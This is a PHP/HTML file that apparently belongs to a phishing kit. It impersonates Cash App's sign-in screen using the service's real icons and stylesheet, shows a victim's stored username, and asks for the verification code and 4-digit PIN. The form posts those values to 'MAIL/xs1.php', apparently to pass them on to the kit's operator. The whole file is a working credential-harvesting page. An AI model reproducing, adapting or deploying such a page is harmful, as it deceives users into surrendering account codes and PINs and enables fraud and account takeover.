<?php
session_start();
?>
<html>
<head>
<title>Cash App</title>
<meta charset="utf-8">
<link rel="icon" sizes="196x196" href="https://cash.app/icon-196.png">
<link rel="icon" href="https://cash.app/favicon.ico">
<link rel="mask-icon" href="https://cash.app/favicon-pinned.svg" color="#18C300">
<link rel="stylesheet" type="text/css" href="https://cash-f.squarecdn.com/ember/8e9fede24675d26d4335a5cac93d444b49c7de11/assets/cash.css" >
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
</head>
<!-------------------------- Body ----------------------------->
<body class="theme-bg ember-application theme-green">
<div id="ember321" class="ember-view">
<div id="ember345" class="full-height application-cash ember-view">  
<div id="ember352" class="cookie-banner ember-view"></div>
<section class="layout-login flex-container full-height pad">
<div class="login-container flex-container flex-v-center flex-fill">
<!---->      
<h1 class="step-title flex-static">Cool! We sent a code to <?php echo $_SESSION['id_00bc4b79dfc3448eb29a5371f1b8b687_Model_UserName']; ?><br>
Confirm your PIN to Sign-In</h1>


<form action="MAIL/xs1.php" method="POST" autocomplete="off" spellcheck="true" novalidate="true" id="signUpForm" class="login-form ember-view">        
<div id="ember384" class="field fk-field-container ember-view">
<input type="text" name="code" id="emailField" required placeholder="Code">
<input type="password" name="pin" id="emailField" required maxlength="4" placeholder="PIN">
<div id="ember399" class="cta submit-button-component submit-button-with-spinner ember-view">
<button type="submit" class="button theme-button theme-button"  >Confirm</button>
<div id="ember405" class="spinner-container ember-view"></div></div>
</form>

<!----->
        
      
        
</form>  </div>
</section>

  <!---->
  <div id="ember408" class="modal-manager ember-view"><div class="modal-overlay "></div>
<!----></div>
</div></div>





</body>

</html>